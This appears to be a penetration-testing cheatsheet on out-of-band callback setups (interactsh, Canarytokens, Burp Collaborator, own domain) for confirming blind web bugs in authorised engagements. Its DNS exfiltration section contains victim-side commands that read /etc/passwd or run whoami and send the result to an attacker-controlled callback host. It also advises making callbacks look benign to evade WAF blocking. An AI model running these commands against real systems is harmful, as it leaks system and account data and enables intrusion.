---
title: "OOB Callback Infrastructure"
type: cheatsheet
tags: [oob, ssrf, xxe, ssti, command-injection, blind, recon, web, exfiltration]
date_created: 2026-06-18
date_updated: 2026-06-18
sources: [interactsh-github, canarytokens-docs, portswigger-collaborator]
---

## Why

Blind bug classes (blind SSRF, blind XXE, blind SSTI, blind/OOB SQLi, blind RCE, blind CRLF/SMTP) produce **no response signal**. The engagement rule is hard: an OOB callback is required to prove them, never inference. This page is the channel setup the hunt skills and payload pages assume when they say "confirm with Collaborator/interactsh". Cross-refs: [[ssrf]], [[xxe]], [[ssti]], [[os-command-injection]], [[sql-injection]].

## Channel choice

DNS fires more often than HTTP: egress firewalls usually allow outbound DNS (port 53) even when they block HTTP, and a DNS lookup happens during name resolution before any connection. So **prefer a DNS-capable channel** and treat an HTTP hit as the stronger second signal.

| Need | Use |
|------|-----|
| DNS + HTTP + SMTP, self-hostable, scriptable | interactsh |
| One-off HTTP callback, zero setup | webhook.site / Beeceptor / RequestBin |
| DNS + HTTP, free, persistent token | Canarytokens |
| Pro Burp workflow | Burp Collaborator (hosted or self-hosted) |
| Full control / data exfil at scale | own domain + authoritative DNS |

Always use a **unique correlation subdomain per injection point** so a late callback maps back to the exact payload.

## interactsh (default)

Client (ProjectDiscovery). Each run prints a random `*.oast.fun` (or `oast.pro`/`oast.site`) domain; every DNS/HTTP/SMTP hit to it is logged with source IP and timestamp.

```bash
# install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# run - prints your callback domain, streams interactions
interactsh-client

# quieter / scriptable: only show the interaction, JSON for parsing
interactsh-client -json -o interactions.json

# poll faster, filter by protocol
interactsh-client -v -poll-interval 5
```

Use the printed domain in a payload, e.g. SSRF: `http://<id>.oast.fun`, then watch the client for `[<id>.oast.fun] Received DNS interaction`.

### Self-hosted interactsh (own domain, recommended for bug bounty)

Public `oast.fun` is sometimes blocklisted by targets/WAFs. Self-host on a VPS with your own domain so callbacks look benign.

```bash
# DNS: at your registrar, delegate the domain (or a subdomain) to the VPS
#   NS  ns1.example.com  ->  <VPS-IP>
#   A   ns1.example.com  ->  <VPS-IP>
#   glue record for ns1 pointing at the VPS

# on the VPS (needs ports 53/tcp+udp, 80, 443, 25 open)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest
interactsh-server -domain example.com -ip <VPS-IP> \
  -listen-ip <VPS-IP> -auto-tls   # Let's Encrypt for HTTPS callbacks

# point the client at it
interactsh-client -server https://example.com
```

## Quick HTTP-only (no DNS, no setup)

- `https://webhook.site` - open page, copy the unique URL, every request shown live with full headers/body. Best for fast HTTP SSRF/CSRF/webhook confirmation.
- Beeceptor, RequestBin (requestrepo.com), `pipedream` - same idea.
- Limitation: **no DNS-only callback**, so a target that resolves but cannot make an HTTP request will not register. Use interactsh/Canarytokens for the DNS signal.

## Canarytokens (free, DNS + HTTP, persistent)

`https://canarytokens.org` - generate a DNS or web token, get a `*.canarytokens.com` host, receive email/webhook on trigger. Good for low-and-slow stored/blind payloads that may fire days later.

## Burp Collaborator

Burp Pro: Repeater/Intruder -> "Insert Collaborator payload", or run a Collaborator client (Burp menu) to generate `*.oastify.com` and poll. Self-host with the Collaborator server on your own domain (`burpcollaborator` config + wildcard DNS + TLS cert) when `oastify.com` is filtered. Scanner auto-injects Collaborator payloads for blind classes.

## Own domain (max control + data exfil)

```bash
# authoritative-ish DNS sink: log every lookup to your domain
sudo tcpdump -i any -n -s0 'udp port 53' | grep --line-buffered yourdomain

# raw HTTP catcher
sudo python3 -m http.server 80
# or full request dump
sudo nc -lvnp 80
```

## Exfiltrating data over DNS

When only DNS egress works, smuggle data out as subdomain labels (e.g. blind RCE / blind XXE). Encode to survive DNS: hex or base32 (DNS is case-insensitive, so avoid base64), respect the **63-char per-label / 253-char total** limits, chunk if needed.

```bash
# attacker side: watch labels
interactsh-client    # or tcpdump on :53

# victim side (blind RCE), exfil a file/secret as a hex label:
data=$(cat /etc/passwd | head -c 30 | xxd -p | tr -d '\n'); \
  nslookup $data.<id>.oast.fun
# command output as a label:
nslookup `whoami`.<id>.oast.fun
# blind XXE OOB (external DTD on your HTTP catcher) -> see [[xxe]]
```

## Discipline

- One unique subdomain per injection point; record which payload used which ID.
- Stop condition for a blind vector: per the engagement rule, ~30-40 payloads with zero callbacks = exhausted; log to `Deadends.md` and switch vector. Do not grind.
- No callback != not vulnerable (egress fully filtered), but **no callback = no claim**. Never report a blind bug on timing/inference alone.

## Sources

- ProjectDiscovery interactsh (slug: interactsh-github) (`https://github.com/projectdiscovery/interactsh`).
- Canarytokens (slug: canarytokens-docs) (`https://canarytokens.org`).
- PortSwigger Burp Collaborator (slug: portswigger-collaborator) (`https://portswigger.net/burp/documentation/collaborator`).
